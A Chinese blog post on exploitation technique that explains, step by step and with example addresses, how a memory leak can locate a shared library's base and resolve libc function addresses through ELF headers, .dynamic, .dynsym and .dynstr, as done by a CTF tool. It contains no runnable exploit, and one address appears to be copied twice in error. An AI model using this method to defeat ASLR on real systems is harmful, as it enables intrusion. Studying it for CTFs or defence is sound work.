泄漏ELF共享对象基址重置后内部函数的地址

发表于 2016-09-09   |   分类于 Articles   |  

前言

前几天写rctf-qual-2015-welpwn的时候用了DynELF模块。那时不用libc-database的原因是担心有时libc会找不到。

用DynELF写exploit的时候遇到了不少麻烦（最终解决了），所以还是希望能理解一下DynELF寻找函数加载地址的原理，恰好前几天看到了一篇这篇文章[1]，理解了原理后，今天自己动手尝试了一下，顺便记录。

正文

0x0 说明

以x86-64为例
以寻找libc中函数为例

0x1 寻找ELF文件动态加载的基址

首先看一下ELF文件头，文件头的第一个成员就是魔数(Magic)，其开头为"\x7fELF"，我们可以根据它来确定ELF加载的基址。

在寻找加载后基址前，我们首先要泄露出这个ELF文件加载入内存后其中的某个函数的地址。这个地址容易泄露，只要泄露GOT表中某个已经调用过的函数即可，这里我们选取write函数(0x7f048c08e860)

然后舍弃泄露出来的地址的最后12位（ELF文件加载地址是页对齐的），得到0x7f048c08e000，对这个地址不断减0x1000，然后泄露其开始的4个字节，直到于Magic的头4个字节匹配为止。即可得到ELF文件加载的基址(0x7f048bfa3000)

0x02 寻找DYNAMIC段

DYNAMIC段中存储着.dynamicsection，它与动态链接有关的section，我们需要找到它的位置

首先要找程序头表(Promgram Header Table)，再看一下ELF文件头e_phoff成员存储该ELF文件载入内存后的程序头表在虚拟内存中的相对地址，其绝对地址 = elf_base + 相对地址（elf_base为ELF文件的基址，在上面已求得），易求得，libc程序头表绝对地址为0x7f048bfa3000 + 0x40 = 0x7f048bfa3040

解释一下程序头表的结构，它是一个结构体数组，每一个结构体是一个segment header，结构体定义如下，我们需要了解的就是p_type和p_vaddr成员，p_type代表segment的类型，p_vaddr存储的是该段的虚拟地址

我们要找的DYNAMIC段的p_type为0x2，根据这个就可以找到DYNAMIC段的segment header，然后查询该头的p_vaddr成员，，由于我机器上的libc为PIC(通过readelf -d libc.so | grep TEXTREL可判断是否为PIC），该虚拟地址代表的是相对虚拟地址，实际虚拟地址还需要加上libc_base，易求得为0x7f048c360ba0

由此，我们已经得到了DYNAMIC段的虚拟地址，通过readelf容易看到，这个segment中只有.dynamic这一个section被映射进来，因此
我们得到的这个地址也是.dynamic映射进来后的虚拟地址

0x03 寻找动态链接符号表(.dynsym)和动态链接字符串表(.dynstr)

.dynamic段也是一个结构体数组，结构体的定义如下，它含有与动态链接有关的section的信息，其中d_tag成员代表不同的section，后面的d_un联合体用来代表大小或者是地址

我们要找的动态链接符合表(DT_SYMTAB)和动态链接字符串表(DT_STRTAB)的d_tag值分别为0x6和0x5，其分别对应的d_un值即为相对应的虚拟地址(0x7f048c360ba0和0x7f048bfa6d28)

0x04

至此，我们已经找到了.dynsym和.dynstr，再解释一下.dynsym的结构，他是一个结构体数组，每个结构体定义如下，其中st_name的值，为该符号所对应的符合名字符串在.dynstr中的偏移，st_value为该符号的相对地址，该相对地址加上libc_base即为该符号对应的实际地址

因此我们要做的就是遍历.dynsym表，然后在.dynstr中查找对应字符串，与我们的目标函数名字符串进行对比，直到匹配为止，就此得到我们的目标函数在符号表内的位置，其st_value值加上libc_base就得到了函数的地址了！
